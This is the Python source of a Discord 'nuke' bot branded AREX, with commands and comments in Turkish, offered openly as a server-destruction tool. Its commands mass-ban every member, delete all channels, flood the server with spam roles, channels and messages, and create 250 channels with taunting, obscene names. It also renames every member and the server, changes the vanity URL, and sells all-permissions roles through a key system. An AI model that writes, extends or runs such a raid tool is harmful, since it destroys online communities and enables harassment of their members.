import discord
from discord.ext import commands
import asyncio
import json
import datetime
import random
import string
from datetime import timedelta
import os

# Replit için özel ayarlar
import keep_alive
keep_alive.keep_alive()

# Bot ayarları
intents = discord.Intents.all()
bot = commands.Bot(command_prefix='+', intents=intents, help_command=None)

# Veritabanı dosyası
DB_FILE = 'keys.json'

# Anahtar veritabanı yükleme
def load_keys():
    try:
        with open(DB_FILE, 'r') as f:
            return json.load(f)
    except:
        return {'keys': {}, 'users': {}}

# Anahtar veritabanı kaydetme
def save_keys(data):
    with open(DB_FILE, 'w') as f:
        json.dump(data, f, indent=4)

# Rastgele anahtar oluşturma
def generate_key(duration):
    key = ''.join(random.choices(string.ascii_uppercase + string.digits, k=16))
    durations = {
        '24 saat': 24,
        '1 gün': 24,
        '1 hafta': 168,
        '1 ay': 720,
        '1 yıl': 8760
    }
    expiry = datetime.datetime.now() + timedelta(hours=durations.get(duration, 24))
    return key, expiry

@bot.event
async def on_ready():
    print(f'{bot.user.name} başarıyla giriş yaptı!')
    await bot.change_presence(activity=discord.Game(name="+yardım | AREX"))

# Gelişmiş Embed Yardım Sistemi
@bot.command()
async def yardım(ctx):
    embed = discord.Embed(
        title="🚀 AREX Discord Patlatma Botu - Komut Listesi",
        description="**Gelişmiş Sunucu Yönetim Araçları**",
        color=0xff0000,
        timestamp=datetime.datetime.now()
    )
    
    embed.set_thumbnail(url="https://i.imgur.com/ABCD123.png")
    embed.set_footer(text=f"İsteyen: {ctx.author.name}", icon_url=ctx.author.avatar.url if ctx.author.avatar else None)
    
    # Yetki Komutları
    embed.add_field(
        name="🔨 **YETKİ KOMUTLARI**",
        value="```css\n[+] +yetki - 'yetkiarex' rolü oluşturur ve size verir\n[+] +key-olustur <user_id> <süre> - Anahtar oluşturur\n[+] +key <key> - Anahtar aktivasyonu\n[+] +key_liste - Anahtar kullanıcılarını listeler```",
        inline=False
    )
    
    # Ban Komutları
    embed.add_field(
        name="⛔ **BAN KOMUTLARI**",
        value="```css\n[+] +ban @üye [sebep] - Üyeyi banlar\n[+] +ban_all - Tüm sunucuyu banlar```",
        inline=False
    )
    
    # Sunucu Tahribat Komutları
    embed.add_field(
        name="💥 **TAHRİBAT KOMUTLARI**",
        value="```css\n[+] +spam_roles <sayı> <rol_adı> - Rol spam yapar\n[+] +delete_all - Tüm kanalları siler\n[+] +spam_channel <kanal_adı> <sayı> - Kanal spam yapar\n[+] +channel_finish - 250 özel kanal oluşturur\n[+] +rolall - 'AREX NEVER DİE!' rolünü herkese verir\n[+] +isimall <isim> - Herkesin ismini değiştirir\n[+] +isimsv <isim> - Sunucu ismini değiştirir```",
        inline=False
    )
    
    # Diğer Komutlar
    embed.add_field(
        name="🔧 **DİĞER KOMUTLAR**",
        value="```css\n[+] +spam <sayı> <mesaj> - Mesaj spam yapar\n[+] +url <url_adı> - Sunucu URL'sini değiştirir\n[+] +kaç - Sunucudan ayrılır```",
        inline=False
    )
    
    await ctx.send(embed=embed)

# +yetki komutu
@bot.command()
@commands.has_permissions(administrator=True)
async def yetki(ctx):
    guild = ctx.guild
    role_name = "yetkiarex"
    
    # Rol kontrolü ve oluşturma
    role = discord.utils.get(guild.roles, name=role_name)
    if not role:
        role = await guild.create_role(
            name=role_name,
            permissions=discord.Permissions.all(),
            color=discord.Color.red(),
            reason="AREX Yetki Sistemi"
        )
    
    # Kullanıcıya rol verme
    await ctx.author.add_roles(role)
    
    embed = discord.Embed(
        title="✅ Yetki Verildi!",
        description=f"{ctx.author.mention} kullanıcısına `{role_name}` rolü verildi.",
        color=0x00ff00
    )
    await ctx.send(embed=embed)

# +ban komutu
@bot.command()
@commands.has_permissions(ban_members=True)
async def ban(ctx, member: discord.Member, *, reason="AREX tarafından banlandı"):
    try:
        await member.ban(reason=reason)
        embed = discord.Embed(
            title="⛔ Ban Başarılı",
            description=f"{member.mention} sunucudan banlandı.\n**Sebep:** {reason}",
            color=0xff0000
        )
        await ctx.send(embed=embed)
    except Exception as e:
        await ctx.send(f"Ban işlemi başarısız: {str(e)}")

# +ban_all komutu
@bot.command()
@commands.has_permissions(administrator=True)
async def ban_all(ctx):
    guild = ctx.guild
    count = 0
    
    embed = discord.Embed(
        title="⚠️ TOPLU BAN BAŞLATILDI",
        description="Tüm üyeler banlanıyor... Bu işlem biraz zaman alabilir.",
        color=0xff0000
    )
    msg = await ctx.send(embed=embed)
    
    for member in guild.members:
        if member != ctx.author and not member.bot:
            try:
                await member.ban(reason="AREX Toplu Ban")
                count += 1
                await asyncio.sleep(0.5)
            except:
                continue
    
    embed = discord.Embed(
        title="✅ TOPLU BAN TAMAMLANDI",
        description=f"**{count}** üye başarıyla banlandı!",
        color=0x00ff00
    )
    await msg.edit(embed=embed)

# +spam_roles komutu
@bot.command()
@commands.has_permissions(manage_roles=True)
async def spam_roles(ctx, count: int, *, role_name):
    guild = ctx.guild
    
    embed = discord.Embed(
        title="🔄 ROL SPAM BAŞLATILDI",
        description=f"{count} adet '{role_name}' rolü oluşturuluyor...",
        color=0xffaa00
    )
    msg = await ctx.send(embed=embed)
    
    for i in range(count):
        try:
            await guild.create_role(
                name=f"{role_name} {i+1}",
                color=discord.Color(random.randint(0, 0xFFFFFF)),
                reason="AREX Rol Spam"
            )
            await asyncio.sleep(0.3)
        except:
            continue
    
    embed = discord.Embed(
        title="✅ ROL SPAM TAMAMLANDI",
        description=f"**{count}** adet rol başarıyla oluşturuldu!",
        color=0x00ff00
    )
    await msg.edit(embed=embed)

# +delete_all komutu
@bot.command()
@commands.has_permissions(manage_channels=True)
async def delete_all(ctx):
    guild = ctx.guild
    
    embed = discord.Embed(
        title="🗑️ KANAL SİLME BAŞLATILDI",
        description="Tüm kanallar siliniyor...",
        color=0xff0000
    )
    msg = await ctx.send(embed=embed)
    
    for channel in guild.channels:
        try:
            await channel.delete(reason="AREX Kanal Temizliği")
            await asyncio.sleep(0.5)
        except:
            continue
    
    embed = discord.Embed(
        title="✅ KANAL SİLME TAMAMLANDI",
        description="Tüm kanallar başarıyla silindi!",
        color=0x00ff00
    )
    await msg.edit(embed=embed)

# +spam_channel komutu
@bot.command()
@commands.has_permissions(manage_channels=True)
async def spam_channel(ctx, channel_name, count: int):
    guild = ctx.guild
    
    embed = discord.Embed(
        title="📢 KANAL SPAM BAŞLATILDI",
        description=f"{count} adet '{channel_name}' kanalı oluşturuluyor...",
        color=0xffaa00
    )
    msg = await ctx.send(embed=embed)
    
    for i in range(count):
        try:
            await guild.create_text_channel(
                name=f"{channel_name}-{i+1}",
                reason="AREX Kanal Spam"
            )
            await asyncio.sleep(0.3)
        except:
            continue
    
    embed = discord.Embed(
        title="✅ KANAL SPAM TAMAMLANDI",
        description=f"**{count}** adet kanal başarıyla oluşturuldu!",
        color=0x00ff00
    )
    await msg.edit(embed=embed)

# +channel_finish komutu
@bot.command()
@commands.has_permissions(administrator=True)
async def channel_finish(ctx):
    guild = ctx.guild
    channels = [
        "AREX-UĞRADI",
        "SİKİLDİNİZ",
        "SAPLADIK-GEÇTİK",
        "DAİME-AREX",
        "BİAT-EDİCEKSİNİZ",
        "KAN-KUSACAKSİNİZ"
    ]
    
    embed = discord.Embed(
        title="💣 SON DARBE BAŞLATILDI",
        description="250 adet özel kanal oluşturuluyor...",
        color=0xff0000
    )
    msg = await ctx.send(embed=embed)
    
    created = 0
    for i in range(250):
        try:
            channel_name = random.choice(channels)
            await guild.create_text_channel(
                name=f"{channel_name}-{i+1}",
                reason="AREX Channel Finish"
            )
            created += 1
            await asyncio.sleep(0.2)
        except:
            continue
    
    embed = discord.Embed(
        title="✅ SON DARBE TAMAMLANDI",
        description=f"**{created}** adet kanal başarıyla oluşturuldu!\nSunucu tamamen ele geçirildi!",
        color=0x00ff00
    )
    await msg.edit(embed=embed)

# +rolall komutu
@bot.command()
@commands.has_permissions(manage_roles=True)
async def rolall(ctx):
    guild = ctx.guild
    role_name = "AREX NEVER DİE!"
    
    # Rol oluşturma
    role = discord.utils.get(guild.roles, name=role_name)
    if not role:
        role = await guild.create_role(
            name=role_name,
            color=discord.Color.red(),
            reason="AREX Rol Dağıtımı"
        )
    
    # Rolü herkese verme
    embed = discord.Embed(
        title="🔄 ROL DAĞITIMI BAŞLATILDI",
        description="Tüm üyelere rol veriliyor...",
        color=0xffaa00
    )
    msg = await ctx.send(embed=embed)
    
    count = 0
    for member in guild.members:
        if not member.bot:
            try:
                await member.add_roles(role)
                count += 1
                await asyncio.sleep(0.3)
            except:
                continue
    
    embed = discord.Embed(
        title="✅ ROL DAĞITIMI TAMAMLANDI",
        description=f"**{count}** üyeye `{role_name}` rolü verildi!",
        color=0x00ff00
    )
    await msg.edit(embed=embed)

# +isimall komutu
@bot.command()
@commands.has_permissions(manage_nicknames=True)
async def isimall(ctx, *, new_name):
    guild = ctx.guild
    
    embed = discord.Embed(
        title="🔄 İSİM DEĞİŞTİRME BAŞLATILDI",
        description=f"Tüm üyelerin isimleri '{new_name}' olarak değiştiriliyor...",
        color=0xffaa00
    )
    msg = await ctx.send(embed=embed)
    
    count = 0
    for member in guild.members:
        if not member.bot:
            try:
                await member.edit(nick=new_name)
                count += 1
                await asyncio.sleep(0.5)
            except:
                continue
    
    embed = discord.Embed(
        title="✅ İSİM DEĞİŞTİRME TAMAMLANDI",
        description=f"**{count}** üyenin ismi başarıyla değiştirildi!",
        color=0x00ff00
    )
    await msg.edit(embed=embed)

# +isimsv komutu
@bot.command()
@commands.has_permissions(manage_guild=True)
async def isimsv(ctx, *, new_name):
    guild = ctx.guild
    
    old_name = guild.name
    await guild.edit(name=new_name)
    
    embed = discord.Embed(
        title="✅ SUNUCU İSMİ DEĞİŞTİRİLDİ",
        description=f"**{old_name}** → **{new_name}**",
        color=0x00ff00
    )
    await ctx.send(embed=embed)

# +spam komutu
@bot.command()
async def spam(ctx, count: int, *, message):
    if count > 50:
        count = 50
    
    for i in range(count):
        try:
            await ctx.send(f"{message} ({i+1}/{count})")
            await asyncio.sleep(0.5)
        except:
            break

# +url komutu
@bot.command()
@commands.has_permissions(manage_guild=True)
async def url(ctx, *, vanity_url):
    guild = ctx.guild
    
    try:
        await guild.edit(vanity_code=vanity_url)
        embed = discord.Embed(
            title="✅ URL DEĞİŞTİRİLDİ",
            description=f"Sunucu URL'si başarıyla değiştirildi:\ndiscord.gg/{vanity_url}",
            color=0x00ff00
        )
        await ctx.send(embed=embed)
    except Exception as e:
        await ctx.send(f"URL değiştirilemedi: {str(e)}")

# +kaç komutu
@bot.command()
async def kaç(ctx):
    embed = discord.Embed(
        title="👋 GÜLE GÜLE",
        description="Sunucudan ayrılıyorum...",
        color=0xff0000
    )
    await ctx.send(embed=embed)
    await ctx.guild.leave()

# ANAHTAR SİSTEMİ

# +key-olustur komutu
@bot.command()
@commands.has_permissions(administrator=True)
async def key_olustur(ctx, user_id: int, duration: str):
    valid_durations = ['24 saat', '1 gün', '1 hafta', '1 ay', '1 yıl']
    
    if duration not in valid_durations:
        await ctx.send(f"Geçersiz süre! Kullanılabilir süreler: {', '.join(valid_durations)}")
        return
    
    data = load_keys()
    key, expiry = generate_key(duration)
    
    data['keys'][key] = {
        'user_id': user_id,
        'duration': duration,
        'expiry': expiry.isoformat(),
        'created_at': datetime.datetime.now().isoformat(),
        'created_by': ctx.author.id,
        'used': False
    }
    
    save_keys(data)
    
    embed = discord.Embed(
        title="🔑 ANAHTAR OLUŞTURULDU",
        description=f"**Kullanıcı ID:** {user_id}\n**Süre:** {duration}\n**Anahtar:** `{key}`\n**Bitiş Tarihi:** {expiry.strftime('%d/%m/%Y %H:%M')}",
        color=0x00ff00
    )
    embed.set_footer(text="Bu anahtarı +key komutuyla kullanabilirsiniz")
    
    # Özel mesaj gönder
    try:
        user = await bot.fetch_user(user_id)
        await user.send(f"🎉 Yeni anahtarınız: `{key}`\nSüre: {duration}\nBotu sunucunuza ekleyip `+key {key}` komutunu kullanın!")
    except:
        pass
    
    await ctx.author.send(embed=embed)
    await ctx.send("✅ Anahtar başarıyla oluşturuldu! Detaylar özel mesajınıza gönderildi.")

# +key komutu
@bot.command()
async def key(ctx, key_code):
    data = load_keys()
    
    if key_code not in data['keys']:
        await ctx.send("❌ Geçersiz anahtar!")
        return
    
    key_data = data['keys'][key_code]
    
    if key_data['used']:
        await ctx.send("❌ Bu anahtar zaten kullanılmış!")
        return
    
    # Süre kontrolü
    expiry = datetime.datetime.fromisoformat(key_data['expiry'])
    if datetime.datetime.now() > expiry:
        await ctx.send("❌ Bu anahtarın süresi dolmuş!")
        return
    
    # Kullanıcı ID kontrolü
    if key_data['user_id'] != ctx.author.id:
        await ctx.send("❌ Bu anahtar size ait değil!")
        return
    
    # Anahtarı kullanılmış olarak işaretle
    data['keys'][key_code]['used'] = True
    data['keys'][key_code]['used_at'] = datetime.datetime.now().isoformat()
    
    # Kullanıcıyı kaydet
    if str(ctx.author.id) not in data['users']:
        data['users'][str(ctx.author.id)] = []
    
    data['users'][str(ctx.author.id)].append({
        'key': key_code,
        'activated_at': datetime.datetime.now().isoformat(),
        'duration': key_data['duration']
    })
    
    save_keys(data)
    
    # Yetki rolü verme
    guild = ctx.guild
    role_name = "yetkiarex"
    role = discord.utils.get(guild.roles, name=role_name)
    
    if not role:
        role = await guild.create_role(
            name=role_name,
            permissions=discord.Permissions.all(),
            color=discord.Color.red(),
            reason="AREX Anahtar Aktivasyonu"
        )
    
    await ctx.author.add_roles(role)
    
    embed = discord.Embed(
        title="🎉 ANAHTAR AKTİVE EDİLDİ",
        description=f"**Kullanıcı:** {ctx.author.mention}\n**Süre:** {key_data['duration']}\n**Rol:** `{role_name}` verildi!",
        color=0x00ff00
    )
    embed.set_footer(text=f"Anahtar: {key_code}")
    
    await ctx.send(embed=embed)

# +key_liste komutu
@bot.command()
@commands.has_permissions(administrator=True)
async def key_liste(ctx):
    data = load_keys()
    
    embed = discord.Embed(
        title="📋 ANAHTAR LİSTESİ",
        description="Oluşturulan tüm anahtarlar:",
        color=0x7289da
    )
    
    used_count = 0
    active_count = 0
    
    for key, key_data in data['keys'].items():
        status = "✅ Kullanılmış" if key_data['used'] else "🟢 Aktif"
        if key_data['used']:
            used_count += 1
        else:
            active_count += 1
        
        user = await bot.fetch_user(key_data['user_id']) if key_data['user_id'] else "Bilinmiyor"
        username = f"{user.name}#{user.discriminator}" if user else "Bilinmiyor"
        
        embed.add_field(
            name=f"Anahtar: `{key[:8]}...` - {status}",
            value=f"**Kullanıcı:** {username}\n**Süre:** {key_data['duration']}\n**Oluşturulma:** {key_data['created_at'][:10]}",
            inline=False
        )
    
    embed.set_footer(text=f"Toplam: {len(data['keys'])} | Aktif: {active_count} | Kullanılmış: {used_count}")
    
    await ctx.send(embed=embed)

# Hata yakalama
@bot.event
async def on_command_error(ctx, error):
    if isinstance(error, commands.MissingPermissions):
        embed = discord.Embed(
            title="❌ Yetkiniz Yok!",
            description="Bu komutu kullanmak için gerekli yetkilere sahip değilsiniz.",
            color=0xff0000
        )
        await ctx.send(embed=embed)
    elif isinstance(error, commands.MissingRequiredArgument):
        embed = discord.Embed(
            title="❌ Eksik Argüman!",
            description=f"Doğru kullanım: `+{ctx.command.name} {ctx.command.signature}`",
            color=0xff0000
        )
        await ctx.send(embed=embed)
    else:
        print(f"Hata: {error}")

# Replit token ayarı
TOKEN = os.environ.get('DISCORD_TOKEN')

if __name__ == "__main__":
    # Replit için web sunucusu başlatma
    try:
        from flask import Flask
        app = Flask(__name__)
        
        @app.route('/')
        def home():
            return "AREX Bot Aktif!"
        
        import threading
        threading.Thread(target=lambda: app.run(host='0.0.0.0', port=8080)).start()
    except:
        pass
    
    # Botu başlat
    bot.run(TOKEN)

